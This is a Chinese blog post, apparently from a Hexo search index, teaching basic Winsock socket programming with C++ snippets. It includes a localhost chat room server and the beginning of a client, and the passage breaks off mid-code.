<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>网络编程————基础</title>
      <link href="2020/12/05/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E5%9F%BA%E7%A1%80/"/>
      <url>2020/12/05/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><h2 id="Berkeley-Socket套接字"><a href="#Berkeley-Socket套接字" class="headerlink" title="Berkeley Socket套接字"></a>Berkeley Socket套接字</h2><p>套接字（ Socket）最初是由加利福尼亚大学Berkeley分校为UNIX操作系统开发的网络通信接口，20世纪80年代初，加利福尼亚大学 Berkeley将美国国防部高研署提供的tC/iP集成到Unix中，并很快开发了TCP/IP应用程序接口（API），即 Socket（套接字）接口随着UNIX操作系统的广泛使用，套接字成为当前最流行的网络通信应用程序接口之一。</p><h2 id="WinSocket套接字"><a href="#WinSocket套接字" class="headerlink" title="WinSocket套接字"></a>WinSocket套接字</h2><p>90年代初，由 Sun Microsystems， JSB Corporation， FTP software， Microdyne和 MicrosoftW等几家公司共同制定了一套标准，即 Sockets规范。它是 Berkeley Sockets的重要扩充，主要体现在它增加了一些异步函数和符合 Windows消息驱动特性的网络事件异步选择机制。 Windows Sockets规范是一套开放的、支持多种协议的 Windows下的网络编程接口。目前实际应用中的 Windows Sockets规范主要有1.1版和2.0版，其中1.1版只支持TCP/IP协议，而2.0版支持多协议，并具有良好的向后兼容性。</p><h1 id="创建流程"><a href="#创建流程" class="headerlink" title="创建流程"></a>创建流程</h1><h2 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h2><h3 id="初始化套接字"><a href="#初始化套接字" class="headerlink" title="初始化套接字"></a>初始化套接字</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">WSADATA wsadata = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">int</span> result = WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;wsadata);</span><br><span class="line">check_result(!result &amp;&amp; wsadata.wVersion == <span class="number">0x0202</span>, <span class="string">&quot;套接字环境初始化失败!&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="建立socket"><a href="#建立socket" class="headerlink" title="建立socket"></a>建立socket</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SOCKET client = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line">check_result(client != INVALID_SOCKET, <span class="string">&quot;套接字创建失败!&quot;</span>);</span><br></pre></td></tr></table></figure><ul><li><strong>domain</strong> 通常为<em>PF_INET</em>，表示互联网协议（TCP/IP）</li><li><strong>type</strong> 指定了Socket的类型 <em>SOCK_STREAM</em>（TCP），<em>SOCK_DGRAM</em>（UDP）</li><li><strong>protocol</strong> 通常赋值为0</li></ul><h3 id="绑定socket"><a href="#绑定socket" class="headerlink" title="绑定socket"></a>绑定socket</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SOCKADDR_IN server_addr = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">server_addr.sin_family = AF_INET;<span class="comment">// 协议</span></span><br><span class="line">server_addr.sin_port = htons(<span class="number">0x1515</span>);<span class="comment">// 端口</span></span><br><span class="line">inet_pton(AF_INET, <span class="string">&quot;127.0.0.1&quot;</span>, &amp;server_addr.sin_addr);</span><br><span class="line">result = connect(client, (SOCKADDR*)&amp;server_addr, <span class="keyword">sizeof</span>(server_addr));</span><br><span class="line">check_result(result != SOCKET_ERROR, <span class="string">&quot;套接字绑定失败!&quot;</span>);</span><br></pre></td></tr></table></figure><ul><li><p><strong>scokfd</strong> Socket()函数返回的Socket套接字</p></li><li><p><strong>MyAddrr</strong> 指向含有本机IP地址及端口号的<em>sockaddr</em>类型的指针</p><ul><li><em>sockaddr</em></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span>&#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> as_family;<span class="comment">//地址族，AF_xxx </span></span><br><span class="line">    <span class="keyword">char</span> sa_data[<span class="number">14</span>]; <span class="comment">//14字节的协议地址</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* **sa_family** 一般为*AF_INET*，代表TCP&#x2F;IP</span><br><span class="line">* **sa_data** 包含socket的IP地址和端口号</span><br></pre></td></tr></table></figure><ul><li><em>sockaddr_in</em> 这个结构更加通用，与<em>socketaddr</em>结构体类似，且他们的指针可以互相替代</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span>&#123;</span></span><br><span class="line">    <span class="keyword">short</span> <span class="keyword">int</span> sin_family;<span class="comment">//地址族</span></span><br><span class="line">    unsignedshort <span class="keyword">int</span> sin_port;<span class="comment">//端口号</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">in_addr</span> <span class="title">sin_addr</span>;</span><span class="comment">//IP地址</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> sin_zero[<span class="number">8</span>];<span class="comment">//填充0，以与 struct sockaddr大小保持一致</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">* **sin_family** 必须设置为*AF_INET*</span><br><span class="line">* **sin_port** 端口号</span><br><span class="line">* **sin_addr** 一个unsigned long的IP地址</span><br><span class="line">* **sin)zero** 填充0，用于与sockaddr大小保持一致</span><br></pre></td></tr></table></figure></li></ul><p><strong>注意*sin_port*和*sin_addr*需要转换成网络字节优先顺序</strong></p><h3 id="客户端首发消息"><a href="#客户端首发消息" class="headerlink" title="客户端首发消息"></a>客户端首发消息</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 对于 TCP 程序通过 send 和 recv 收发数据，函数是阻塞</span></span><br><span class="line"><span class="keyword">char</span> buffer[<span class="number">0x100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">recv(client, buffer, <span class="number">0x100</span>, <span class="number">0</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;server: %s\n&quot;</span>, buffer);</span><br></pre></td></tr></table></figure><h4 id="面向连接数据的发送"><a href="#面向连接数据的发送" class="headerlink" title="面向连接数据的发送"></a>面向连接数据的发送</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int send(int sockfd, const void *msg, int len, int flags);</span><br></pre></td></tr></table></figure><ul><li><strong>sockfd</strong> 监听的套接字</li><li><strong>msg</strong> 指向要发送的数据</li><li><strong>len</strong> 以字节为单位的数据长度</li><li><strong>flags</strong> 一般设置为0</li><li>返回值为实际发送出去的字节数</li></ul><h4 id="面向连接的数据接收"><a href="#面向连接的数据接收" class="headerlink" title="面向连接的数据接收"></a>面向连接的数据接收</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int recv(int sockfd, void *buf, int len, int flags);</span><br></pre></td></tr></table></figure><ul><li><strong>sockfd</strong> 监听的套接字</li><li><strong>buf</strong> 存放接收数据的缓冲区</li><li><strong>len</strong> 以字节为单位的数据长度</li><li><strong>flags</strong> 一般设置为0</li><li>返回值为实际接收到的数据</li></ul><h4 id="无连接的数据发送"><a href="#无连接的数据发送" class="headerlink" title="无连接的数据发送"></a>无连接的数据发送</h4><p><code>int sendto(int sockfd, const void *msg, int len, int flags, const struct sockaddr \*to, int tolen);**</code>**<br>这个函数比*send()*函数多了两个参数</p><ul><li><strong>to</strong> 要发送数据到的目的主机的IP地址和端口号信息</li><li><strong>tolen</strong> 通常别赋值为<code>sizeof(struct sockaddr)</code></li><li>返回值为实际发送出去的字节数</li></ul><h4 id="无连接的数据接收"><a href="#无连接的数据接收" class="headerlink" title="无连接的数据接收"></a>无连接的数据接收</h4><p><code>int recvfrom(int sockfd, void *buf, int len, int flag, struct sockaddr *from, int \*fromlen);**</code>**<br>这个函数比*recv()*函数多了几个参数</p><ul><li><strong>from</strong> 是一个struct sockaddr类型的变量，保存数据来源主机的IP地址和端口号</li><li><strong>fromlen</strong> 一般设置为<code>sizeof(stuct sockaddr)</code></li><li>返回值为实际接收到的数据</li></ul><h3 id="关闭套接字"><a href="#关闭套接字" class="headerlink" title="关闭套接字"></a>关闭套接字</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">closesocket(client);</span><br><span class="line">WSACleanup();</span><br></pre></td></tr></table></figure><ul><li>停止socket上面的全部操作<br><code>closesocket(sockfd);</code></li><li>关闭socket上面的某一个操作<br><code>int shutdown(int sockfd, int how);</code><br><em>how</em>有几个可选的值<ul><li>0：不允许继续<strong>接收</strong>数据</li><li>1：不允许接续<strong>发送</strong>数据</li><li>2：不允许继续<strong>发送和接收</strong>数据</li></ul></li></ul><h2 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h2><h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 初始化套接字模块，必须是网络程序中第一个调用的函数(搜索信号)</span></span><br><span class="line">WSADATA wsadata = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">int</span> result = WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;wsadata);</span><br><span class="line">check_result(!result &amp;&amp; wsadata.wVersion == <span class="number">0x0202</span>, <span class="string">&quot;套接字环境初始化失败!&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="创建套接字"><a href="#创建套接字" class="headerlink" title="创建套接字"></a>创建套接字</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//参数分别是使用的协议种类，数据传输方式以及协议类型</span></span><br><span class="line">SOCKET server = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line">check_result(server != INVALID_SOCKET, <span class="string">&quot;套接字创建失败!&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="绑定"><a href="#绑定" class="headerlink" title="绑定"></a>绑定</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SOCKADDR_IN server_addr = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">server_addr.sin_family = AF_INET;<span class="comment">// 协议</span></span><br><span class="line">server_addr.sin_port = htons(<span class="number">0x1515</span>);<span class="comment">// 端口</span></span><br><span class="line">inet_pton(AF_INET, <span class="string">&quot;127.0.0.1&quot;</span>, &amp;server_addr.sin_addr);</span><br><span class="line">result = bind(server, (SOCKADDR*)&amp;server_addr, <span class="keyword">sizeof</span>(server_addr));</span><br><span class="line">check_result(result != SOCKET_ERROR, <span class="string">&quot;套接字绑定失败!&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="监听"><a href="#监听" class="headerlink" title="监听"></a>监听</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">result = listen(server, SOMAXCONN);</span><br><span class="line">check_result(result != SOCKET_ERROR, <span class="string">&quot;套接字监听失败!&quot;</span>);</span><br></pre></td></tr></table></figure><p>服务器端程序调用listern()函数使得socket处于一个别动监听的模式，并且为这个socket建立一个输入数据队列，将到达服务器的请求保存到此队列中，直到程序处理。<br><code>int listen(int sockfd, int backlog);</code></p><ul><li><strong>sockfd</strong> 调用socket()函数返回的socket套接字</li><li><strong>backlog</strong> 指定在请求队列中允许的最大请求数</li><li>缓存队列中的请求，等待<em>accept</em>处理</li></ul><h3 id="等待客户端连接"><a href="#等待客户端连接" class="headerlink" title="等待客户端连接"></a>等待客户端连接</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> size = <span class="keyword">sizeof</span>(SOCKADDR_IN);</span><br><span class="line">SOCKADDR_IN client_addr = &#123; <span class="number">0</span> &#125;;<span class="comment">// 用于接收客户端信息(来电显示)</span></span><br><span class="line">SOCKET client = accept(server, (SOCKADDR*)&amp;client_addr, &amp;size);</span><br><span class="line">check_result(client != INVALID_SOCKET, <span class="string">&quot;客户端接收失败!&quot;</span>);</span><br></pre></td></tr></table></figure><p>建立好缓存队列后，服务器端程序可以调用accept()函数处理客户的连接请求。<br><code>int accept(int sockfd, void *addr, int *addrlen);</code></p><ul><li><strong>sockfd</strong> 被监听的socket套接字</li><li><strong>addr</strong> 通常是一个指向sockaddr_in变量的指针，该变量用于存储提出连接请求的主机信息</li><li><strong>addrlen</strong> 通常是一个指向值为<code>sizeof(struct sockaddr_in)</code>的整型指针变量</li></ul><h3 id="关闭套接字-1"><a href="#关闭套接字-1" class="headerlink" title="关闭套接字"></a>关闭套接字</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">closesocket(client);</span><br><span class="line">closesocket(server);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 8. 清理套接字模块坏境</span></span><br><span class="line">WSACleanup();</span><br></pre></td></tr></table></figure><h1 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h1><h2 id="案例1"><a href="#案例1" class="headerlink" title="案例1"></a>案例1</h2><h3 id="聊天室服务器"><a href="#聊天室服务器" class="headerlink" title="聊天室服务器"></a>聊天室服务器</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 0. 添加必要的头文件，并且链接到相应的静态库</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ws2tcpip.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 用于保存当前连接到服务器的所有客户端</span></span><br><span class="line"><span class="built_in">map</span>&lt;SOCKET, <span class="built_in">string</span>&gt; clients;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查函数的执行结果是否正确</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">check_result</span><span class="params">(<span class="keyword">bool</span> result, <span class="keyword">const</span> <span class="keyword">char</span>* msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 如果传入的表达式位假，意味着出错</span></span><br><span class="line"><span class="keyword">if</span> (result == <span class="literal">false</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;error: %s\n&quot;</span>, msg);</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>); <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 用于接收服务器消息的线程</span></span><br><span class="line"><span class="function">DWORD CALLBACK <span class="title">RecvThread</span><span class="params">(LPVOID param)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 由于参数是套接字对象，所以在这里接收</span></span><br><span class="line">SOCKET client = (SOCKET)param;</span><br><span class="line"><span class="keyword">char</span> buffer[<span class="number">0x100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 循环的接收客户端发送过来的数据(当返回值&lt;=0表示断开连接)</span></span><br><span class="line"><span class="keyword">while</span> (recv(client, buffer, <span class="number">0x100</span>, <span class="number">0</span>) &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 服务器在接收到消息之后，只负责转发消息</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span>&amp; sock : clients)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 如果发送者和遍历到的是同一个，就不发</span></span><br><span class="line"><span class="keyword">if</span> (sock.first == client)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在每一条消息之前添加一个发送者的用户名</span></span><br><span class="line"><span class="built_in">string</span> msg = clients[client] + <span class="string">&quot;: &quot;</span> + buffer;</span><br><span class="line"></span><br><span class="line">send(sock.first, msg.c_str(), msg.length() + <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果结束了循环，就表示这个循环所属的套接字断开了连接，移除列表</span></span><br><span class="line"><span class="comment">// clients.erase(find(clients.begin(), clients.end(), client));</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s 离开了服务器\n&quot;</span>, clients[client].c_str());</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 1. 初始化套接字模块，必须是网络程序中第一个调用的函数(搜索信号)</span></span><br><span class="line">WSADATA wsadata = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">int</span> result = WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;wsadata);</span><br><span class="line">check_result(!result &amp;&amp; wsadata.wVersion == <span class="number">0x0202</span>, <span class="string">&quot;套接字环境初始化失败!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 创建一个套接字，应该保存[IP:PORT](买一部手机)</span></span><br><span class="line"><span class="comment">//参数分别是使用的协议种类，数据传输方式以及协议类型</span></span><br><span class="line">SOCKET server = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line">check_result(server != INVALID_SOCKET, <span class="string">&quot;套接字创建失败!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 将套接字绑定到指定的 ip 地址和端口(安装手机卡)</span></span><br><span class="line">SOCKADDR_IN server_addr = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">server_addr.sin_family = AF_INET;<span class="comment">// 协议</span></span><br><span class="line">server_addr.sin_port = htons(<span class="number">0x1515</span>);<span class="comment">// 端口</span></span><br><span class="line">inet_pton(AF_INET, <span class="string">&quot;127.0.0.1&quot;</span>, &amp;server_addr.sin_addr);</span><br><span class="line">result = bind(server, (SOCKADDR*)&amp;server_addr, <span class="keyword">sizeof</span>(server_addr));</span><br><span class="line">check_result(result != SOCKET_ERROR, <span class="string">&quot;套接字绑定失败!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. 开启套接字的监听状态，第二个参数是同一时刻可以等待的客户端数量(开机)</span></span><br><span class="line">result = listen(server, SOMAXCONN);</span><br><span class="line">check_result(result != SOCKET_ERROR, <span class="string">&quot;套接字监听失败!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (TRUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 5. 等待客户端的连接，返回值是连接到的客户端(等接电话)</span></span><br><span class="line"><span class="keyword">int</span> size = <span class="keyword">sizeof</span>(SOCKADDR_IN);</span><br><span class="line">SOCKADDR_IN client_addr = &#123; <span class="number">0</span> &#125;;<span class="comment">// 用于接收客户端信息(来电显示)</span></span><br><span class="line">SOCKET client = accept(server, (SOCKADDR*)&amp;client_addr, &amp;size);</span><br><span class="line">check_result(client != INVALID_SOCKET, <span class="string">&quot;客户端接收失败!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果有客户端连接到了服务器，要求给服务器传递一个昵称</span></span><br><span class="line"><span class="keyword">char</span> nickname[<span class="number">0x100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">recv(client, nickname, <span class="number">0x100</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// [如果有客户端连接，就放入到客户端容器中]</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s 连接到了服务器\n&quot;</span>, nickname);</span><br><span class="line">clients[client] = nickname;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 6. 为每一个客户端创建一个线程，用于执行信息的接收操作</span></span><br><span class="line">CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, RecvThread, (LPVOID)client, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 8. 当数据处理结束之后，需要断开连接</span></span><br><span class="line">closesocket(server);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 9. 清理套接字模块坏境</span></span><br><span class="line">WSACleanup();</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="聊天室客户端"><a href="#聊天室客户端" class="headerlink" title="聊天室客户端"></a>聊天室客户端</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 0. 添加必要的头文件，并且链接到相应的静态库</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ws2tcpip.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查函数的执行结果是否正确</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">check_result</span><span class="params">(<span class="keyword">bool</span> result, <span class="keyword">const</span> <span class="keyword">char</span>* msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 如果传入的表达式位假，意味着出错</span></span><br><span class="line"><span class="keyword">if</span> (result == <span class="literal">false</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;error: %s\n&quot;</span>, msg);</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>); <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 用于接收服务器消息的线程</span></span><br><span class="line"><span class="function">DWORD CALLBACK <span class="title">RecvThread</span><span class="params">(LPVOID param)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 由于参数是套接字对象，所以在这里接收</span></span><br><span class="line">SOCKET client = (SOCKET)param;</span><br><span class="line"><span class="keyword">char</span> buffer[<span class="number">0x100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 循环的接收服务器发送过来的数据(当返回值&lt;=0表示断开连接)</span></span><br><span class="line"><span class="keyword">while</span> (recv(client, buffer, <span class="number">0x100</span>, <span class="number">0</span>) &gt; <span class="number">0</span>)</span><br><span 